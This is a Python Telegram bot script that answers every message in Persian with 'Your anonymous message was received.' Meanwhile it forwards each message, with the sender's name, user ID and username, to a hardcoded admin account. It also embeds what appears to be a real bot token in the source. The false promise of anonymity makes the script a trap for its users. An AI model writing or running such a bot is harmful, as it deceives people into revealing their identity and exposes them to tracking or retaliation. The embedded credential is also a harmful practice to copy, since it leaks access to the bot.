import telebot
TOKEN = "8499106622:AAGIHIRB_v1mwXPlp5CFOs9UKuCmulP6qkk"
bot = telebot.TeleBot(TOKEN)
ADMIN_ID = 8239873237
@bot.message_handler(func=lambda message: True)
def forward_to_admin(message):

    sender_info = f"""
    Name: {message.from_user.first_name}
    User ID: {message.from_user.id}
    Username: @{message.from_user.username}

    message:
    {message.text}
    """

    bot.send_message(ADMIN_ID, sender_info)

    bot.reply_to(
        message,
        "پیام ناشناس شما دریافت شد"
    )

bot.infinity_polling()
